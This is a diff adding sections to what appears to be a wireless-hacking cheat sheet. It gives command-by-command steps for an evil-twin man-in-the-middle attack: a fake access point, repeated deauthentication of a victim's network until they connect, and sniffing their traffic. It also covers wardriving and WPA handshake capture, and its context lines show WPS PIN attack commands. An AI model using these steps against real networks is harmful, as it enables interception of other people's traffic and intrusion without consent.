@@ -314,3 +314,49 @@ python3 oneshot.py -b <bssid> wlan0 -p 12345678
 Using WPS Button
 python3 oneshot.py -b <bssid> wlan0 --pbc
 ```
+
+```
+Man in the Middle Attack
+First install dependencies.
+apt-get install bridge-utils
+
+Start your wireless card in monitor mode
+airmon-ng start wlan0
+
+Setup the wireless card as access point using your desired BSSID.
+airbase-ng –e “<desired BSSID>” <monitor wireless card>
+
+Setup the bridge
+brctl addbr <BridgeName>
+brctl addif <BridgeName> <monitor wireless card>
+
+Power up your internet connection and your bridge name
+ifconfig eth0 0.0.0.0 up
+ifconfig <BridgeName> up
+
+Setup dhclient
+dhclient3 <BridgeName>
+
+Deauthenticate you’r target.
+aireplay-ng –deauth 0 –a <victimBSSID> wlan0mon
+
+Wait for your target to connect to you’r Fake Access Point. If not, repeat the deauthentication until it succed.
+
+Then using wireshark analyse the traffic of you’r target.
+
+# Filter : 
+# ;select <BridgeName> interface
+```
+
+```
+Wardriving
+Using WiGLE
+You can browse the WiGLE website to look you’r profil and more.
+Download the WiGLE APK
+Open it on your phone, run the scan and drive.
+
+Using Pwnagtochi
+Pwnagotchi is running on Raspberry Pi and allow you to do various Wireless attacks, but specifically against WPA.
+Using plugins, you can submit handshakes online and attempt to crack it.
+Plugins allow you to save coordination like wardriving.
+```
